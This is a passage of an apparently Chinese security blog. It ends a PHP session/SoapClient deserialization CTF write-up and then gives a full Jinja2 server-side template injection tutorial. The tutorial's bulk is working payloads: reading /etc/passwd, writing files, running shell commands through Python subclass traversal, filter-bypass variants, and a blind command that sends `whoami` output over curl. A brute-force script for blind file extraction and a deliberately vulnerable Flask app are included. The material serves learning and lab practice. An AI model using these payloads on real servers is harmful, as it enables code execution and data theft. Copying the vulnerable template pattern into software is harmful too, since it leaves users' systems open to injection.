<p><img src="https://s2.ax1x.com/2019/07/09/Z6Vqrq.png" alt="Z6Vqrq.png"></p>
<p>最终通过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=extract&amp;name=SoapClient 同时POST b=call_user_func</span><br></pre></td></tr></table></figure>

<p>调用Soapclient类中不存在的welcome方法，触发<code>__call</code>函数，完成location,拿到Session中的flag，回到本页面dump出来。最终结果：</p>
<p><img src="https://s2.ax1x.com/2019/07/09/Z6ZYFS.png" alt="Z6ZYFS.png"></p>
<h3 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h3><p>对于Session的攻击点，有如下几种:</p>
<ul>
<li>条件竞争发送与<code>session.upload_progress.name</code>同名字的变量，利用LFI进行getshell.</li>
<li>序列化引擎处理不当造成反序列化漏洞，配合PHP内置类Soap可打出SSRF的效果</li>
<li><code>session_start</code>函数可控，如果该函数可控的话，攻击者可以通过改变session的储存位置进行getshell，或者改变序列化引擎，造成反序列漏洞，甚至配合Soap类以及CRLF漏洞完成内网攻击。所以由此可见，暴露出phpinfo界面的危害还是蛮大的。</li>
</ul>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-详细题解/" target="_blank" rel="noopener">https://www.smi1e.top/lctf2018-bestphps-revenge-%e8%af%a6%e7%bb%86%e9%a2%98%e8%a7%a3/</a></p>
<p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0</a></p>
<p>[<a href="https://jsproxy.ga/-----https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/]" target="_blank" rel="noopener">https://jsproxy.ga/-----https://skysec.top/2018/11/17/2018-Xctf%20Final&amp;LCTF-Bestphp/]</a>(<a href="https://jsproxy.ga/-----https://skysec.top/2018/11/17/2018-Xctf" target="_blank" rel="noopener">https://jsproxy.ga/-----https://skysec.top/2018/11/17/2018-Xctf</a> Final&amp;LCTF-Bestphp/)</p>
<p><a href="https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/" target="_blank" rel="noopener">https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/09/php-session%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" data-id="ckabsu38y002ykkvr83fkhy1x" class="article-share-link" data-share="baidu" data-title="php-session配置不当产生的安全问题">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/09/php-session%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-SSTI模板注入-Jinja2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/" class="article-date">
  <time datetime="2019-07-07T12:03:16.000Z" itemprop="datePublished">2019-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/">SSTI模板注入-Jinja2</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>又划水了一天，最后划累了学习了一会，写了这篇文章，又遇到的<code>hexo</code>遇见花括号解析错误的问题，一点点把文章断点才解决(<code>hexo</code>断点调试</p>
<h3 id="SSTI介绍"><a href="#SSTI介绍" class="headerlink" title="SSTI介绍"></a><code>SSTI</code>介绍</h3><p><code>SSTI</code>，服务端模板注入攻击，发生在<code>MVA</code>框架的<code>view</code>层中。</p>
<p>注入原因：</p>
<blockquote>
<p>服务端接收了用户的输入，将未过滤的数据传给引擎解析，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题</p>
</blockquote>
<p>测试<code>SSTI</code>的流程方式如下图：</p>
<p><img src="https://s2.ax1x.com/2019/07/06/Z0NUje.png" alt="Z0NUje.png"></p>
<h4 id="SSTI-for-Flask"><a href="#SSTI-for-Flask" class="headerlink" title="SSTI for Flask"></a><strong>SSTI for Flask</strong></h4><p><code>Flask</code>的模板引擎为<code>Jinja2</code>,而主要出现问题的函数为<code>render_template_string()</code>，并没有渲染模板文件，直接把字符串渲染到了<code>html</code>,如果不经过过滤则很容易造成恶意代码注入问题。</p>
<h3 id="实战过程"><a href="#实战过程" class="headerlink" title="实战过程"></a>实战过程</h3><h4 id="代码搭建"><a href="#代码搭建" class="headerlink" title="代码搭建"></a>代码搭建</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">	name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">	template = <span class="string">'&lt;h1&gt;hello &#123;&#125;!&lt;h1&gt;'</span>.format(name)</span><br><span class="line">	<span class="keyword">return</span> render_template_string(template)</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<h4 id="注入检测"><a href="#注入检测" class="headerlink" title="注入检测"></a>注入检测</h4><p><img src="https://s2.ax1x.com/2019/07/06/Z0cb2d.png" alt="Z0cb2d.png"></p>
<p>通过<code>payload:1+1</code>的返回为<code>2</code>可以得知存在注入。</p>
<h4 id="导出config变量和session"><a href="#导出config变量和session" class="headerlink" title="导出config变量和session"></a>导出config变量和session</h4><p><img src="https://s2.ax1x.com/2019/07/06/Z0cc8J.png" alt="Z0cc8J.png"></p>
<p>可以通过<code>config</code>和<code>session</code>进行导出</p>
<h4 id="读-写文件"><a href="#读-写文件" class="headerlink" title="读/写文件"></a>读/写文件</h4><h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><p>通过<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure>

<p>以上两种<code>payload</code>都可以进行文件读取</p>
<p><img src="https://s2.ax1x.com/2019/07/06/Z0gmIU.png" alt="Z0gmIU.png"></p>
<h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><p>同样也是两种<code>payload</code>，这里只列举一种了（其实可以通过<code>Fuzz</code>获得多种</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evilconfig.cfg'</span>, <span class="string">'w'</span>).write(<span class="string">'test'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/06/Z0gBQA.png" alt="Z0gBQA.png"></p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment">#也是载入__builtins__</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">29</span>].__call__(eval,<span class="string">'os.system("ls"))</span></span><br></pre></td></tr></table></figure>

<p><strong>python3的命令执行</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('id').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'filename'</span>, <span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<p>既然可以命令执行，同样可以反弹<code>shell</code>，可以通过<code>bash</code>进行反弹<code>shell</code></p>
<h4 id="通过自定义模块执行命令"><a href="#通过自定义模块执行命令" class="headerlink" title="通过自定义模块执行命令"></a>通过自定义模块执行命令</h4><p>通过<code>SSTI</code>将以下内容写入<code>/tmp/test</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/test'</span>, <span class="string">'w'</span>).write(<span class="string">'from os import system\nCMD = system'</span>) &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/test'</span>, <span class="string">'w'</span>).write(<span class="string">'from subprocess import check_output\nRUNCMD=check_output'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>利用<code>config.from_pyfile</code>对<code>/tmp/test</code>进行编译执行文件中的内容</p>
<p><img src="https://s2.ax1x.com/2019/07/07/ZB9Rtf.png" alt="ZB9Rtf.png"></p>
<p>可以通过<code>config</code>中的变量进行命令执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config[<span class="string">'RUNCMD'</span>](<span class="string">'/usr/bin/id'</span>,shell=<span class="literal">True</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="绕过命令执行过滤"><a href="#绕过命令执行过滤" class="headerlink" title="绕过命令执行过滤"></a>绕过命令执行过滤</h3><h4 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号[]"></a>过滤中括号[]</h4><p>可以用<code>getitem</code>和<code>pop</code>进行绕过过滤</p>
<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure>

<h5 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.__globals__.linecache.os.popen(<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure>

<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><h5 id="chr函数绕过过滤"><a href="#chr函数绕过过滤" class="headerlink" title="chr函数绕过过滤"></a><strong>chr函数绕过过滤</strong></h5><p>获取<code>chr</code>函数，后面直接将文件名字<code>chr</code>出来.<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(chr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">116</span>)%<span class="number">2</span>bchr(<span class="number">99</span>)%<span class="number">2</span>bchr(<span class="number">47</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)%<span class="number">2</span>bchr(<span class="number">119</span>)%<span class="number">2</span>bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="借助request对象"><a href="#借助request对象" class="headerlink" title="借助request对象"></a><strong>借助request对象</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br></pre></td></tr></table></figure>

<h5 id="过滤引号下的命令执行"><a href="#过滤引号下的命令执行" class="headerlink" title="过滤引号下的命令执行"></a><strong>过滤引号下的命令执行</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(chr(<span class="number">105</span>)%<span class="number">2</span>bchr(<span class="number">100</span>)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure>

<h4 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h4><p>同样利用<code>request</code>或者<code>__getattr__</code>进行绕过</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>

<h5 id="命令执行-2"><a href="#命令执行-2" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[59][request.args.init][request.args.globals]['linecache'].os.popen('whoami').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__&amp;init=__init__&amp;globals=__globals_</span><br></pre></td></tr></table></figure>

<h4 id="过滤双括号"><a href="#过滤双括号" class="headerlink" title="过滤双括号"></a>过滤双括号</h4><h5 id="利用如下标记，进行盲命令执行"><a href="#利用如下标记，进行盲命令执行" class="headerlink" title="利用如下标记，进行盲命令执行"></a>利用如下标记，进行盲命令执行</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">'curl http://127.0.0.1:7999/?i=`whoami`'</span>).read()==<span class="string">'p'</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/07/ZBZdhR.png" alt="ZBZdhR.png"></p>
<h5 id="盲注文件"><a href="#盲注文件" class="headerlink" title="盲注文件"></a>盲注文件</h5><p>利用<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/lihuaiqiu'</span>).read()[<span class="number">0</span>:<span class="number">1</span>]==<span class="string">'f'</span> %&#125;~ok~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>进行盲注，这里原作者<code>p0</code>的博客中只有<code>post脚本</code>，按照<code>sql</code>盲注的思路我自己也写了一个<code>GET</code>的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1:5000?name="</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload=<span class="string">"&#123;% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/lihuaiqiu').read()["</span>+str(i)+<span class="string">":"</span>+str(i+<span class="number">1</span>)+<span class="string">"]=='"</span>+chr(j)+<span class="string">"' %&#125;~ok~&#123;% endif %&#125;"</span></span><br><span class="line">        true_url=url+payload</span><br><span class="line">        r=requests.get(true_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ok'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://s2.ax1x.com/2019/07/07/ZBcezj.png" alt="ZBcezj.png"></p>
<h3 id="最后关于python沙箱逃逸以及Jinja2的一些思考"><a href="#最后关于python沙箱逃逸以及Jinja2的一些思考" class="headerlink" title="最后关于python沙箱逃逸以及Jinja2的一些思考"></a>最后关于python沙箱逃逸以及Jinja2的一些思考</h3><p>其实<code>SSTI</code>或者说<code>Python</code>沙箱逃逸，最重要的的几点还是找<code>object</code>，获取<code>subclasses</code>，然后对<code>subclasses</code>，进行<code>fuzz</code>，例如找到<code>linecache,catch_warnings</code>这种可以进行危险操作的东西，例如如下脚本的<code>fuzz</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  |% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %|</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  |% endif %|</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;    //这里面的两个竖杠其实也是花括号，这里我是为了避免hexo解析错误的问题</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/07/ZBf9V1.png" alt="ZBf9V1.png"></p>
<p>逻辑就是在<code>subclasses</code>的子类中找到危险子类，可以通过寻找<code>catch_warnings</code>,因为在这个特殊的类中是有<code>__builtins__</code>这种危险属性的。第二个要说明的点是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="comment"># 返回子类的列表 [,,,...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#从中随便选一个类,查看它的__init__</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">30</span>].__init__</span><br><span class="line">&lt;slot wrapper <span class="string">'__init__'</span> of <span class="string">'object'</span> objects&gt;</span><br><span class="line"><span class="comment"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">5</span>].__init__</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">5</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>]</span><br><span class="line"><span class="comment">#然后用eval执行命令即可</span></span><br></pre></td></tr></table></figure>

<p>之前看不是很懂，现在明白了。第三个点是在看一篇博文中发现的问题–<strong>Python的一切皆对象思想</strong></p>
<p><code>Python</code>一切皆对象，对于获取<code>object</code>类，传统的获取方式是<code>().__class__.__base__.subclasses__</code>，但是看到一篇博客后，一些沙雕的局限思维被打开了，这个过滤的部分如下</p>
<ul>
<li>config</li>
<li>class</li>
<li>mro</li>
<li>args</li>
<li>request</li>
<li>open</li>
<li>eval</li>
<li>builtins</li>
<li>import</li>
</ul>
<p>过滤掉了<code>class和request</code>有点致命,也就是说我们无法通过<code>[].__class__.__base__.__subclasses__()</code>这种操作获取基类，也无法通过<code>[][request.args.class]&amp;class=__class__</code>获取<code>object</code>,但是因为python的一切皆是对象思想,这里的<code>session</code>关键字并没有被过滤，其实<code>session</code>和<code>config</code>也是对象,我们可以通过<code>session</code>构造出<code>object</code>，payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0]</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/07/ZBOhFg.png" alt="ZBOhFg.png"></p>
<p>接着可以通过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[<span class="string">'__cla'</span>+<span class="string">'ss__'</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__subclasses__ &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>遍历出所有子类，但是这里class被过滤了，所以只能通过<code>__bases__[0][&#39;__subcl&#39;+&#39;asses__&#39;]</code>进行获取子类，再接着在里面找我们要找的危险类，这位师傅找的是<code>os._wrap_close</code>,不过我并没有在自己的<code>python2.7</code>本地环境找到这个<code>class</code>，最终payload为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; session[<span class="string">'__cla'</span>+<span class="string">'ss__'</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>][<span class="string">'__subcla'</span>+<span class="string">'sses__'</span>]()[<span class="number">312</span>].__init__.__globals__[<span class="string">'po'</span>+<span class="string">'pen'</span>](<span class="string">'ls /'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我本地模拟构造的为</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?name=&#123;&#123;session[%27__cla%27+%27ss__%27].__bases__[0].__bases__[0].__bases__[0].__bases__[0][%27__subc%27+%27lasses__%27]()[40](%27/etc/passwd%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>成功读取了<code>/etc/passwd</code></p>
<p>第二点学到是<code>__enter__与__init__</code>的相似性</p>
<blockquote>
<p><code>object.__enter__</code>(<em>self</em>)</p>
<p>Enter the runtime context related to this object. The <a href="https://docs.python.org/zh-cn/2.7/reference/compound_stmts.html#with" target="_blank" rel="noopener"><code>with</code></a> statement will bind this method’s return value to the target(s) specified in the <a href="https://docs.python.org/zh-cn/2.7/reference/compound_stmts.html#as" target="_blank" rel="noopener"><code>as</code></a> clause of the statement, if any.</p>
</blockquote>
<p>上文为官方文档的描述，也就是我们同样可以通过<code>___enter__</code>来进入我们的对象取代<code>__init__</code>的过滤。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://docs.python.org/zh-cn/2.7/reference/datamodel.html?highlight=__enter__#object.__enter__" target="_blank" rel="noopener">https://docs.python.org/zh-cn/2.7/reference/datamodel.html?highlight=__enter__#object.__enter__</a></p>
<p><a href="https://drops.org.cn/Python/flask-jinja2-ssti.html#directory04395356149972733410" target="_blank" rel="noopener">https://drops.org.cn/Python/flask-jinja2-ssti.html#directory04395356149972733410</a></p>
